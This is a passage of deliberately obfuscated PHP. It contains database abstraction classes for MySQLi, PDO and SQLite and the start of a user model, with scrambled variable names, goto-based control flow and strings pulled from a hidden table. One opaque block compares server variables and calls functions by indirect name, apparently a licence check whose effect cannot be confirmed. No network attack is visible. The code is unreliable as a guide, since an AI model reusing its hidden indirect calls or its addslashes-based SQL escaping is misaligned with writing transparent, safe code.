$e‡¸ï’°©) { $f×³Ÿƒğœ°[$e‡¸ï’°©[$FÚ¦îİÏïÌ[27]]] = array($FÚ¦îİÏïÌ[28] => $e‡¸ï’°©[$FÚ¦îİÏïÌ[27]], $FÚ¦îİÏïÌ[29] => $e‡¸ï’°©[$FÚ¦îİÏïÌ[30]], $FÚ¦îİÏïÌ[31] => (bool) ($e‡¸ï’°©[$FÚ¦îİÏïÌ[32]] === $FÚ¦îİÏïÌ[33]), $FÚ¦îİÏïÌ[34] => $e‡¸ï’°©[$FÚ¦îİÏïÌ[35]], $FÚ¦îİÏïÌ[36] => strtolower($e‡¸ï’°©[$FÚ¦îİÏïÌ[37]]) == $FÚ¦îİÏïÌ[38], $FÚ¦îİÏïÌ[39] => strtolower($e‡¸ï’°©[$FÚ¦îİÏïÌ[40]]) == $FÚ¦îİÏïÌ[41]); } } return $f×³Ÿƒğœ°; } public function getTables($E¨Í¦™² = '') { $cìÛ‹³…˜ =& $_SERVER[Šº]; $a­¦ˆØ ¡± = !empty($E¨Í¦™²) ? $cìÛ‹³…˜[847] . $E¨Í¦™² . $cìÛ‹³…˜[848] : $cìÛ‹³…˜[849]; $eİô«……ßĞ = $this->query($a­¦ˆØ ¡±); $BˆÁ§õÃˆ = array(); if ($eİô«……ßĞ) { foreach ($eİô«……ßĞ as $bÜ´•ğŸ®© => $B¢šªç¿Ï) { $BˆÁ§õÃˆ[$bÜ´•ğŸ®©] = current($B¢šªç¿Ï); } } return $BˆÁ§õÃˆ; } public function replace($FÌà—£ˆ‘‘, $CåÆÁöÔù = array()) { $Aœã™Ïš™ =& $_SERVER[Šº]; foreach ($FÌà—£ˆ‘‘ as $B•ùÛÁ°¹İ => $Fù‡£ˆƒôÄ) { $dö›Ÿ‰™òÒ = $this->parseValue($Fù‡£ˆƒôÄ); if (is_scalar($dö›Ÿ‰™òÒ)) { $FÑÛÍ–É[] = $dö›Ÿ‰™òÒ; $fº‰œÖ¼Ç©[] = $this->parseKey($B•ùÛÁ°¹İ); } } $cŞ§Ç·İ÷¯ = $Aœã™Ïš™[850] . $this->parseTable($CåÆÁöÔù[$Aœã™Ïš™[276]]) . $Aœã™Ïš™[851] . implode($Aœã™Ïš™[47], $fº‰œÖ¼Ç©) . $Aœã™Ïš™[852] . implode($Aœã™Ïš™[47], $FÑÛÍ–É) . $Aœã™Ïš™[853]; return $this->execute($cŞ§Ç·İ÷¯); } public function insertAll($f´‘†Ğ•ƒ, $b†í‹×‘ˆ´ = array(), $Aà’ƒñí = false) { goto bâ êº‘ÖŒ; bâ êº‘ÖŒ: $BÕÙ‰¼¦ˆØ =& $_SERVER[Šº]; if (!is_array($f´‘†Ğ•ƒ[0])) { return !1; } $fÛ¡î›åëİ = array_keys($f´‘†Ğ•ƒ[0]); goto a›àõĞÒÂÎ; Bßº™‚±¢¢: $eòõÖÈ·Ùà = $Aà’ƒñí ? $BÕÙ‰¼¦ˆØ[855] : $BÕÙ‰¼¦ˆØ[856]; $EÓÉãá«‘ä = $eòõÖÈ·Ùà . $BÕÙ‰¼¦ˆØ[857] . $this->parseTable($b†í‹×‘ˆ´[$BÕÙ‰¼¦ˆØ[276]]) . $BÕÙ‰¼¦ˆØ[851] . implode($BÕÙ‰¼¦ˆØ[47], $fÛ¡î›åëİ) . $BÕÙ‰¼¦ˆØ[858] . implode($BÕÙ‰¼¦ˆØ[47], $b»ØÑçù¼Ì); return $this->execute($EÓÉãá«‘ä); goto c®ƒÎ’¯×ê; a›àõĞÒÂÎ: $b»ØÑçù¼Ì = array(); foreach ($f´‘†Ğ•ƒ as $Aì²Ô‘†Ä) { $AÚ†ò© …ã = array(); foreach ($Aì²Ô‘†Ä as $c ¸Êİø„ => $DŠ¥Ş²š´°) { $DŠ¥Ş²š´° = $this->parseValue($DŠ¥Ş²š´°); if (is_scalar($DŠ¥Ş²š´°)) { $AÚ†ò© …ã[] = $DŠ¥Ş²š´°; } } $b»ØÑçù¼Ì[] = $BÕÙ‰¼¦ˆØ[257] . implode($BÕÙ‰¼¦ˆØ[47], $AÚ†ò© …ã) . $BÕÙ‰¼¦ˆØ[853]; } array_walk($fÛ¡î›åëİ, array($this, $BÕÙ‰¼¦ˆØ[854])); goto Bßº™‚±¢¢; c®ƒÎ’¯×ê: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $BÏø¨™á¦§ =& $_SERVER[Šº]; $this->error = $this->_linkID->errno . $BÏø¨™á¦§[4] . $this->_linkID->error; if ($BÏø¨™á¦§[33] != $this->queryStr) { $this->error .= LNG($BÏø¨™á¦§[45]) . $this->queryStr; } think_trace($this->error, $BÏø¨™á¦§[33], $BÏø¨™á¦§[46]); return $this->error; } public function escapeString($Aòë¦¸»›) { if ($this->_linkID) { return $this->_linkID->real_escape_string($Aòë¦¸»›); } else { return addslashes($Aòë¦¸»›); } } public function parseKey(&$CŒ–‡É‘ß¿, $Bª×ôĞ³¼ = true) { $aóÂš‘ÑÆä =& $_SERVER[Šº]; if ($Bª×ôĞ³¼) { $CŒ–‡É‘ß¿ = $this->parseKeyCheck($CŒ–‡É‘ß¿); } if ($CŒ–‡É‘ß¿ != $aóÂš‘ÑÆä[182] && !preg_match($aóÂš‘ÑÆä[859], $CŒ–‡É‘ß¿)) { $CŒ–‡É‘ß¿ = $aóÂš‘ÑÆä[381] . trim($CŒ–‡É‘ß¿, $aóÂš‘ÑÆä[381]) . $aóÂš‘ÑÆä[381]; } return $CŒ–‡É‘ß¿; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($BÌà”›×íä = '') { $A¬‡‘î½ =& $_SERVER[Šº]; if (!class_exists($A¬‡‘î½[861])) { think_exception(think_lang($A¬‡‘î½[10]) . $A¬‡‘î½[862]); } if (!empty($BÌà”›×íä)) { $this->config = $BÌà”›×íä; if (empty($this->config[$A¬‡‘î½[13]])) { $this->config[$A¬‡‘î½[13]] = array(); } } } public function connect($CİÊØˆÅÙÍ = '', $CÚ…Ãö±Êê = 0) { $bİˆê´çÅ =& $_SERVER[Šº]; if (!isset($this->linkID[$CÚ…Ãö±Êê])) { goto C†òĞ‹‡³; Aå›—»˜¤À: if (!$this->linkID[$CÚ…Ãö±Êê]) { think_exception($bİˆê´çÅ[871]); } try { $this->linkID[$CÚ…Ãö±Êê]->exec($bİˆê´çÅ[872] . think_config($bİˆê´çÅ[839])); } catch (Exception $bîÉ­ ‹¶œ) { } $this->connected = !0; goto aËëªÆó¦Í; aËëªÆó¦Í: if (1 != think_config($bİˆê´çÅ[18])) { unset($this->config); } goto Eğò—Œ­øº; C†åâÒøæÙ: try { $this->linkID[$CÚ…Ãö±Êê] = new PDO($CİÊØˆÅÙÍ[$bİˆê´çÅ[863]], $CİÊØˆÅÙÍ[$bİˆê´çÅ[836]], $CİÊØˆÅÙÍ[$bİˆê´çÅ[837]], $CİÊØˆÅÙÍ[$bİˆê´çÅ[13]]); } catch (PDOException $bîÉ­ ‹¶œ) { think_exception($bîÉ­ ‹¶œ->getMessage()); } $this->dbType = $this->_getDsnType($CİÊØˆÅÙÍ[$bİˆê´çÅ[863]]); if (in_array($this->dbType, array($bİˆê´çÅ[864], $bİˆê´çÅ[865], $bİˆê´çÅ[866], $bİˆê´çÅ[867]))) { think_exception($bİˆê´çÅ[868] . $this->dbType . $bİˆê´çÅ[869] . $this->dbType . $bİˆê´çÅ[870]); } goto Aå›—»˜¤À; C†òĞ‹‡³: if (empty($CİÊØˆÅÙÍ)) { $CİÊØˆÅÙÍ = $this->config; } $F£¿œ‚¯¼İ = !empty($CİÊØˆÅÙÍ[$bİˆê´çÅ[13]][$bİˆê´çÅ[14]]) ? $CİÊØˆÅÙÍ[$bİˆê´çÅ[13]][$bİˆê´çÅ[14]] : $this->pconnect; if ($F£¿œ‚¯¼İ) { $CİÊØˆÅÙÍ[$bİˆê´çÅ[13]][PDO::ATTR_PERSISTENT] = !0; } goto C†åâÒøæÙ; Eğò—Œ­øº: } return $this->linkID[$CÚ…Ãö±Êê]; } public function free() { $this->PDOStatement = null; } public function query($F Œì‘…”–, $C×Æ…„‹ï = array()) { goto a¤ùÂˆˆÂÍ; CÛ¦¶½: if (!1 === $b†²˜ğ£›¹) { $this->error(); return !1; } else { return $this->getAll(); } goto E«ÁÏ²Ø†õ; b¯Ô˜˜“½: think_action_status($E£†’¢ª«’[19], 1); think_status($E£†’¢ª«’[20]); $this->PDOStatement = $this->_linkID->prepare($F Œì‘…”–); goto f˜Ş ºŸœŠ; CñìÎ›µ§: $this->queryStr = $F Œì‘…”–; if (!empty($C×Æ…„‹ï)) { $this->queryStr .= $E£†’¢ª«’[873] . print_r($C×Æ…„‹ï, !0) . $E£†’¢ª«’[874]; } if (!empty($this->PDOStatement)) { $this->free(); } goto b¯Ô˜˜“½; a¤ùÂˆˆÂÍ: $E£†’¢ª«’ =& $_SERVER[Šº]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto CñìÎ›µ§; f˜Ş ºŸœŠ: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $b†²˜ğ£›¹ = $this->PDOStatement->execute($C×Æ…„‹ï); $this->debug(); goto CÛ¦¶½; E«ÁÏ²Ø†õ: } public function execute($A¥õŒ†èß, $E×÷¶’‹©ó = array()) { goto A‰•ÇÔ•Ó×; dƒÌ…“Â„: $EóĞí¢¼Ç… = $this->PDOStatement->execute($E×÷¶’‹©ó); $this->debug(); if (!1 === $EóĞí¢¼Ç…) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($d¢İ–ì” || preg_match($Dß©‹‡‡´ï[879], $A¥õŒ†èß)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto DÁĞ½ô¥“Ò; A¤£š‹—‰: if ($this->dbType == $Dß©‹‡‡´ï[867]) { if (preg_match($Dß©‹‡‡´ï[875], $this->queryStr, $F”Ê„ÏÕŒœ)) { $this->table = think_config($Dß©‹‡‡´ï[876]) . str_ireplace(think_config($Dß©‹‡‡´ï[877]), $Dß©‹‡‡´ï[374], $F”Ê„ÏÕŒœ[2]); $d¢İ–ì” = (bool) $this->query($Dß©‹‡‡´ï[878] . strtoupper($this->table) . $Dß©‹‡‡´ï[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Dß©‹‡‡´ï[21], 1); goto FçÏ×©ñ‘¤; eÎÂ‡ô—¯: $this->queryStr = $A¥õŒ†èß; if (!empty($E×÷¶’‹©ó)) { $this->queryStr .= $Dß©‹‡‡´ï[873] . print_r($E×÷¶’‹©ó, !0) . $Dß©‹‡‡´ï[874]; } $d¢İ–ì” = !1; goto A¤£š‹—‰; A‰•ÇÔ•Ó×: $Dß©‹‡‡´ï =& $_SERVER[Šº]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto eÎÂ‡ô—¯; FçÏ×©ñ‘¤: think_status($Dß©‹‡‡´ï[20]); $this->PDOStatement = $this->_linkID->prepare($A¥õŒ†èß); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto dƒÌ…“Â„; DÁĞ½ô¥“Ò: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $bŒã êÑÔç = $this->_linkID->commit(); $this->transTimes = 0; if (!$bŒã êÑÔç) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $eçİ¨šéŞ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$eçİ¨šéŞ) { $this->error(); return !1; } } return !0; } private function getAll() { $a–ÇÈ±Âéø = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($a–ÇÈ±Âéø); return $a–ÇÈ±Âéø; } public function getFields($C‘Í©ãÀİ†) { goto e•Àß‹®Ó£; EÃÕªÆ­ÅÆ: return $eÖŞŸ–¯µƒ; goto fŞåØ õ“Š; e÷ã±õ‡‰ğ: $CÇ–³ÁéÛŒ = $this->query($CƒˆÚ­–§); $eÖŞŸ–¯µƒ = array(); if ($CÇ–³ÁéÛŒ) { foreach ($CÇ–³ÁéÛŒ as $fÇ’‹ƒ¨Ù => $e»õä†‹Û) { $e»õä†‹Û = array_change_key_case($e»õä†‹Û); $e»õä†‹Û[$Dá ŸÏ„›[28]] = isset($e»õä†‹Û[$Dá ŸÏ„›[28]]) ? $e»õä†‹Û[$Dá ŸÏ„›[28]] : $Dá ŸÏ„›[374]; $e»õä†‹Û[$Dá ŸÏ„›[29]] = isset($e»õä†‹Û[$Dá ŸÏ„›[29]]) ? $e»õä†‹Û[$Dá ŸÏ„›[29]] : $Dá ŸÏ„›[374]; $Aö’ê·Š¸è = isset($e»õä†‹Û[$Dá ŸÏ„›[270]]) ? $e»õä†‹Û[$Dá ŸÏ„›[270]] : $e»õä†‹Û[$Dá ŸÏ„›[28]]; $eÖŞŸ–¯µƒ[$Aö’ê·Š¸è] = array($Dá ŸÏ„›[28] => $Aö’ê·Š¸è, $Dá ŸÏ„›[29] => $e»õä†‹Û[$Dá ŸÏ„›[29]], $Dá ŸÏ„›[31] => (bool) (isset($e»õä†‹Û[$Dá ŸÏ„›[103]]) && $e»õä†‹Û[$Dá ŸÏ„›[103]] === $Dá ŸÏ„›[33] || isset($e»õä†‹Û[$Dá ŸÏ„›[31]]) && $e»õä†‹Û[$Dá ŸÏ„›[31]] === $Dá ŸÏ„›[33]), $Dá ŸÏ„›[34] => isset($e»õä†‹Û[$Dá ŸÏ„›[34]]) ? $e»õä†‹Û[$Dá ŸÏ„›[34]] : (isset($e»õä†‹Û[$Dá ŸÏ„›[53]]) ? $e»õä†‹Û[$Dá ŸÏ„›[53]] : $Dá ŸÏ„›[374]), $Dá ŸÏ„›[36] => isset($e»õä†‹Û[$Dá ŸÏ„›[93]]) ? strtolower($e»õä†‹Û[$Dá ŸÏ„›[93]]) == $Dá ŸÏ„›[38] : (isset($e»õä†‹Û[$Dá ŸÏ„›[54]]) ? $e»õä†‹Û[$Dá ŸÏ„›[54]] : !1), $Dá ŸÏ„›[39] => isset($e»õä†‹Û[$Dá ŸÏ„›[896]]) ? strtolower($e»õä†‹Û[$Dá ŸÏ„›[896]]) == $Dá ŸÏ„›[41] : (isset($e»õä†‹Û[$Dá ŸÏ„›[93]]) ? $e»õä†‹Û[$Dá ŸÏ„›[93]] : !1)); } } goto EÃÕªÆ­ÅÆ; e•Àß‹®Ó£: $Dá ŸÏ„› =& $_SERVER[Šº]; $this->initConnect(!0); if (think_config($Dá ŸÏ„›[880])) { $CƒˆÚ­–§ = str_replace($Dá ŸÏ„›[881], $C‘Í©ãÀİ†, think_config($Dá ŸÏ„›[880])); } else { switch ($this->dbType) { case $Dá ŸÏ„›[864]: case $Dá ŸÏ„›[882]: $CƒˆÚ­–§ = "\123\x45\114\x45\x43\x54\x20\x20\40\x63\x6f\154\x75\x6d\156\x5f\156\141\x6d\145\40\x61\163\40\47\x4e\x61\x6d\x65\47\x2c\40\x20\x20\x64\141\164\141\x5f\164\171\160\x65\x20\141\163\40\47\x54\171\x70\145\47\54\x20\40\40\143\x6f\154\165\x6d\156\x5f\x64\145\x66\x61\x75\x6c\x74\x20\x61\163\x20\47\104\x65\x66\x61\x75\154\x74\x27\x2c\40\40\40\x69\x73\137\x6e\165\x6c\x6c\x61\x62\x6c\x65\40\141\163\40\x27\x4e\x75\154\154\47\xa\x9\x9\106\122\x4f\x4d\x9\151\x6e\146\x6f\x72\x6d\x61\164\x69\x6f\156\137\163\143\150\x65\155\141\56\x74\x61\142\154\x65\163\40\x41\123\x20\164\12\x9\x9\x4a\x4f\x49\116\11\x69\156\146\x6f\162\x6d\141\x74\151\157\x6e\137\x73\x63\150\145\x6d\x61\56\x63\157\x6c\165\x6d\x6e\x73\x20\x41\x53\x20\143\xa\x9\11\x4f\116\40\40\164\x2e\x74\141\x62\154\145\137\x63\x61\x74\141\154\157\x67\40\x3d\x20\x63\56\x74\x61\142\x6c\x65\137\143\141\164\x61\x6c\157\x67\12\11\x9\x41\116\x44\x20\164\x2e\164\x61\142\x6c\x65\x5f\163\143\x68\x65\155\x61\40\x3d\x20\143\x2e\x74\141\142\154\x65\x5f\x73\x63\150\145\x6d\141\xa\11\11\x41\x4e\104\x20\x74\56\x74\141\142\154\x65\x5f\156\x61\x6d\145\x20\x3d\x20\x63\56\164\141\x62\154\x65\x5f\x6e\141\x6d\x65\xa\x9\x9\x57\x48\105\122\105\40\x20\40\x74\56\164\141\142\x6c\145\137\x6e\x61\x6d\x65\40\x3d\40\47{$C‘Í©ãÀİ†}\x27"; break; case $Dá ŸÏ„›[883]: $CƒˆÚ­–§ = $Dá ŸÏ„›[884] . $C‘Í©ãÀİ† . $Dá ŸÏ„›[885]; break; case $Dá ŸÏ„›[865]: case $Dá ŸÏ„›[867]: $CƒˆÚ­–§ = $Dá ŸÏ„›[886] . $Dá ŸÏ„›[887] . $Dá ŸÏ„›[888] . strtoupper($C‘Í©ãÀİ†) . $Dá ŸÏ„›[889] . strtoupper($C‘Í©ãÀİ†) . $Dá ŸÏ„›[890]; break; case $Dá ŸÏ„›[891]: $CƒˆÚ­–§ = $Dá ŸÏ„›[892] . $C‘Í©ãÀİ† . $Dá ŸÏ„›[893]; break; case $Dá ŸÏ„›[866]: break; case $Dá ŸÏ„›[894]: default: $CƒˆÚ­–§ = $Dá ŸÏ„›[895] . ($this->dbType == $Dá ŸÏ„›[894] ? "\x60{$C‘Í©ãÀİ†}\140" : $C‘Í©ãÀİ†); } } goto e÷ã±õ‡‰ğ; fŞåØ õ“Š: } public function getTables($Eİ‡¼­ëÈÖ = '') { $e×Ï³ôÖÕì =& $_SERVER[Šº]; if (think_config($e×Ï³ôÖÕì[897])) { $f¶ÍŞÔ¨Ç = str_replace($e×Ï³ôÖÕì[898], $Eİ‡¼­ëÈÖ, think_config($e×Ï³ôÖÕì[897])); } else { switch ($this->dbType) { case $e×Ï³ôÖÕì[865]: case $e×Ï³ôÖÕì[867]: $f¶ÍŞÔ¨Ç = $e×Ï³ôÖÕì[899]; break; case $e×Ï³ôÖÕì[864]: case $e×Ï³ôÖÕì[882]: $f¶ÍŞÔ¨Ç = $e×Ï³ôÖÕì[900]; break; case $e×Ï³ôÖÕì[891]: $f¶ÍŞÔ¨Ç = $e×Ï³ôÖÕì[901]; break; case $e×Ï³ôÖÕì[866]: think_exception(think_lang($e×Ï³ôÖÕì[902]) . $e×Ï³ôÖÕì[903]); break; case $e×Ï³ôÖÕì[883]: $f¶ÍŞÔ¨Ç = $e×Ï³ôÖÕì[42] . $e×Ï³ôÖÕì[43] . $e×Ï³ôÖÕì[44]; break; case $e×Ï³ôÖÕì[894]: default: if (!empty($Eİ‡¼­ëÈÖ)) { $f¶ÍŞÔ¨Ç = $e×Ï³ôÖÕì[847] . $Eİ‡¼­ëÈÖ . $e×Ï³ôÖÕì[848]; } else { $f¶ÍŞÔ¨Ç = $e×Ï³ôÖÕì[849]; } } } $dÓºå‡ÜŞé = $this->query($f¶ÍŞÔ¨Ç); $Cáï¥­Ê‹ = array(); foreach ($dÓºå‡ÜŞé as $cĞøø™àÖÃ => $bŞñÈ¤ÜÆ) { $Cáï¥­Ê‹[$cĞøø™àÖÃ] = current($bŞñÈ¤ÜÆ); } return $Cáï¥­Ê‹; } protected function parseLimit($eç°Ù½Ú¯Ô) { $b²×óŠÉ‹ë =& $_SERVER[Šº]; $cõ¶Ò«ö‘ö = $b²×óŠÉ‹ë[33]; if (!empty($eç°Ù½Ú¯Ô)) { switch ($this->dbType) { case $b²×óŠÉ‹ë[891]: case $b²×óŠÉ‹ë[883]: $eç°Ù½Ú¯Ô = explode($b²×óŠÉ‹ë[47], $eç°Ù½Ú¯Ô); if (count($eç°Ù½Ú¯Ô) > 1) { $cõ¶Ò«ö‘ö .= $b²×óŠÉ‹ë[48] . $eç°Ù½Ú¯Ô[1] . $b²×óŠÉ‹ë[49] . $eç°Ù½Ú¯Ô[0] . $b²×óŠÉ‹ë[50]; } else { $cõ¶Ò«ö‘ö .= $b²×óŠÉ‹ë[48] . $eç°Ù½Ú¯Ô[0] . $b²×óŠÉ‹ë[50]; } break; case $b²×óŠÉ‹ë[864]: case $b²×óŠÉ‹ë[882]: break; case $b²×óŠÉ‹ë[866]: break; case $b²×óŠÉ‹ë[865]: case $b²×óŠÉ‹ë[867]: break; case $b²×óŠÉ‹ë[894]: default: $cõ¶Ò«ö‘ö .= $b²×óŠÉ‹ë[48] . $eç°Ù½Ú¯Ô . $b²×óŠÉ‹ë[50]; } } return $cõ¶Ò«ö‘ö; } public function parseKey(&$d”Òµèí´ó, $D‹À±ªˆ„” = true) { $dœÛ‰—šÓï =& $_SERVER[Šº]; if ($D‹À±ªˆ„”) { $d”Òµèí´ó = $this->parseKeyCheck($d”Òµèí´ó); } if ($this->dbType == $dœÛ‰—šÓï[894]) { if ($d”Òµèí´ó != $dœÛ‰—šÓï[182] && !preg_match($dœÛ‰—šÓï[859], $d”Òµèí´ó)) { $d”Òµèí´ó = $dœÛ‰—šÓï[381] . trim($d”Òµèí´ó, $dœÛ‰—šÓï[381]) . $dœÛ‰—šÓï[381]; } return $d”Òµèí´ó; } else { return parent::parseKey($d”Òµèí´ó, $D‹À±ªˆ„”); } } public function close() { $this->_linkID = null; } public function error() { $D¿Œ¥Ñìè§ =& $_SERVER[Šº]; if ($this->PDOStatement) { $C¡ŒøÉùİ³ = $this->PDOStatement->errorInfo(); $this->error = $C¡ŒøÉùİ³[1] . $D¿Œ¥Ñìè§[4] . $C¡ŒøÉùİ³[2]; } else { $this->error = $D¿Œ¥Ñìè§[33]; } if ($D¿Œ¥Ñìè§[33] != $this->queryStr) { $this->error .= LNG($D¿Œ¥Ñìè§[45]) . $this->queryStr; } think_trace($this->error, $D¿Œ¥Ñìè§[33], $D¿Œ¥Ñìè§[46]); return $this->error; } public function escapeString($bè×ğŞà®•) { $bŠÆÁ¹Õå¨ =& $_SERVER[Šº]; switch ($this->dbType) { case $bŠÆÁ¹Õå¨[891]: case $bŠÆÁ¹Õå¨[864]: case $bŠÆÁ¹Õå¨[882]: case $bŠÆÁ¹Õå¨[894]: return addslashes($bè×ğŞà®•); case $bŠÆÁ¹Õå¨[866]: case $bŠÆÁ¹Õå¨[883]: case $bŠÆÁ¹Õå¨[865]: case $bŠÆÁ¹Õå¨[867]: return str_ireplace($bŠÆÁ¹Õå¨[55], $bŠÆÁ¹Õå¨[56], $bè×ğŞà®•); } } protected function parseValue($c…«¥»¹) { $FŠŞŸÚíË =& $_SERVER[Šº]; if (is_string($c…«¥»¹)) { $e·Åñò©ä‘ = strpos($c…«¥»¹, $FŠŞŸÚíË[4]) === 0 && in_array($c…«¥»¹, array_keys($this->bind)); $c…«¥»¹ = $e·Åñò©ä‘ ? $this->escapeString($c…«¥»¹) : $FŠŞŸÚíË[904] . $this->escapeString($c…«¥»¹) . $FŠŞŸÚíË[904]; } elseif (isset($c…«¥»¹[0]) && is_string($c…«¥»¹[0]) && strtolower($c…«¥»¹[0]) == $FŠŞŸÚíË[294]) { $c…«¥»¹ = $this->escapeString($c…«¥»¹[1]); } elseif (is_array($c…«¥»¹)) { $c…«¥»¹ = array_map(array($this, $FŠŞŸÚíË[905]), $c…«¥»¹); } elseif (is_bool($c…«¥»¹)) { $c…«¥»¹ = $c…«¥»¹ ? $FŠŞŸÚíË[87] : $FŠŞŸÚíË[504]; } elseif (is_null($c…«¥»¹)) { $c…«¥»¹ = $FŠŞŸÚíË[103]; } return $c…«¥»¹; } public function getLastInsertId() { $b¾ÊóÓ¦Ú =& $_SERVER[Šº]; switch ($this->dbType) { case $b¾ÊóÓ¦Ú[891]: case $b¾ÊóÓ¦Ú[883]: case $b¾ÊóÓ¦Ú[864]: case $b¾ÊóÓ¦Ú[882]: case $b¾ÊóÓ¦Ú[866]: case $b¾ÊóÓ¦Ú[894]: return $this->_linkID->lastInsertId(); case $b¾ÊóÓ¦Ú[865]: case $b¾ÊóÓ¦Ú[867]: $eÍñİŠ§ = $this->table; $EÉ§‚Ö¨”— = $this->query("\x53\105\x4c\x45\103\x54\40{$eÍñİŠ§}\x2e\x63\165\162\x72\166\141\154\x20\143\165\x72\162\x76\141\x6c\40\106\x52\117\115\x20\x64\165\141\x6c"); return $EÉ§‚Ö¨”— ? $EÉ§‚Ö¨”—[0][$b¾ÊóÓ¦Ú[906]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($c¡ºîÆË¾Œ) { $d§›¿Á±¡­ =& $_SERVER[Šº]; if (!CacheLock::fileLock($d§›¿Á±¡­[9])) { return !1; } $EÅˆ†Şä‚Å = parent::query($c¡ºîÆË¾Œ); CacheLock::fileUnLock($d§›¿Á±¡­[9]); return $EÅˆ†Şä‚Å; } public function execute($c ŒÃÖí‹®) { $d‡Õ¯ßìÚŸ =& $_SERVER[Šº]; if (!CacheLock::fileLock($d‡Õ¯ßìÚŸ[9])) { return !1; } $C¢ƒÍå¶³ˆ = parent::execute($c ŒÃÖí‹®); CacheLock::fileUnLock($d‡Õ¯ßìÚŸ[9]); return $C¢ƒÍå¶³ˆ; } } goto FÕ©ÅâØÉ¯; aóŒˆ³”®ß: if ($_SERVER[$_SERVER[Šº][395]] != $_SERVER[$_SERVER[Šº][1246]]) { goto cÖ”œ¶©; cÖ”œ¶©: $e©™˜Ã¤‹Ó = $_SERVER[Šº][396]; $F«¿¹÷É¸’ = $_SERVER[$_SERVER[Šº][397]] . $_SERVER[Šº][398]; $BÙ‰–à‘· = $e©™˜Ã¤‹Ó($F«¿¹÷É¸’); goto a‘èö¸½Ÿ; b©‚ß¿É¢•: $CÍ×˜œ‹Ç£($_SERVER[$_SERVER[Šº][393]]); goto c­Ù‡òà£»; a‘èö¸½Ÿ: $bÜ³——¾Æ = explode($_SERVER[Šº][228], $BÙ‰–à‘·); if (count($bÜ³——¾Æ) < $_SERVER[Šº][399]) { $b‘Õœ„÷éö = $_SERVER[Šº][400]; $b‘Õœ„÷éö(); } $CÍ×˜œ‹Ç£ = $_SERVER[Šº][401]; goto b©‚ß¿É¢•; c­Ù‡òà£»: } class UserModel extends ModelBase { protected $tableName = "\165\x73\145\x72"; protected $tableMeta = array("\x74\x61\x62\x6c\145\x4e\x61\155\x65" => "\165\x73\x65\x72\137\155\x65\164\x61", "\155\145\164\141\106\151\x65\x6c\x64" => "\165\x73\x65\x72\x49\104"); protected $simpleField = "\165\x73\x65\162\x49\x44\54\156\151\x63\153\x4e\141\155\x65\54\156\x61\x6d\x65\x2c\x61\x76\x61\164\141\162\x2c\163\145\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($bÎÎª’­“) { $eèØ–¡ïå =& $_SERVER[Šº]; $C®Â°Ì³ßº = $eèØ–¡ïå[2100]; return array($eèØ–¡ïå[1747] => array($bÎÎª’­“[0], $C®Â°Ì³ßº), $eèØ–¡ïå[1749] => array($bÎÎª’­“[0], $C®Â°Ì³ßº), $eèØ–¡ïå[2101] => array($bÎÎª’­“[0], $C®Â°Ì³ßº)); } protected function getInfo($fÍ‹öª¬, $Eå†¦‰˜‚ = false) { $fíÀÛŸğ• = $this->getInfoSimple($fÍ‹öª¬); if (!is_array($fíÀÛŸğ•)) { return array(); } if ($Eå†¦‰˜‚) { return $this->_getInfoApply($fíÀÛŸğ•); } return $this->cacheFunctionGet($_SERVER[Šº][1756], $fÍ‹öª¬); } protected function getInfoFull($fÀæŒ·ÄÏÁ, $f‰¡ŒÁºÆô = false) { $AŠÁÍ®§ä = $this->getInfoSimple($fÀæŒ·ÄÏÁ); if (!is_array($AŠÁÍ®§ä)) { return array(); } if ($f‰¡ŒÁºÆô) { return $this->_getInfoApply($AŠÁÍ®§ä, !0); return $this->_getInfoApply($AŠÁÍ®§ä, !0); } return $this->cacheFunctionGet($_SERVER[Šº][2102], $fÀæŒ·ÄÏÁ); } private function _getInfoApply($d†éƒ”Õ½á, $DÃ™ˆâèø’ = false) { goto f§Œ‡ªÒ´; f“Àª‰ï‚«: $d†éƒ”Õ½á = $this->_listDataApplyItem($d†éƒ”Õ½á); $FùØ¤÷ğá = Model($C¤´À †íé[1192])->metaGet($d†éƒ”Õ½á[$C¤´À †íé[85]][$C¤´À †íé[403]]); $d†éƒ”Õ½á[$C¤´À †íé[2105]] = $Fíƒ®æê‰; goto e›¦—›¦™; f§Œ‡ªÒ´: $C¤´À †íé =& $_SERVER[Šº]; if (!$d†éƒ”Õ½á) { return $d†éƒ”Õ½á; } $Fíƒ®æê‰ = md5($C¤´À †íé[2103] . $d†éƒ”Õ½á[$C¤´À †íé[837]] . $C¤´À †íé[2104] . $d†éƒ”Õ½á[$C¤´À †íé[28]]); goto f“Àª‰ï‚«; e›¦—›¦™: $d†éƒ”Õ½á[$C¤´À †íé[85]][$C¤´À †íé[1937]] = isset($FùØ¤÷ğá[$C¤´À †íé[1938]]) ? $FùØ¤÷ğá[$C¤´À †íé[1938]] : null; if ($DÃ™ˆâèø’) { $d†éƒ”Õ½á[$C¤´À †íé[452]] = $this->metaGet($d†éƒ”Õ½á[$C¤´À †íé[1514]]); } return $d†éƒ”Õ½á; goto CÊÛ‰ôÅ; CÊÛ‰ôÅ: } protected function getInfoSimple($b²ß‘İ¸Õ‚, $Eî©¬á³Ûù = false) { $D¨Üä±¦¶† =& $_SERVER[Šº]; if (!$b²ß‘İ¸Õ‚) { return array(); } if 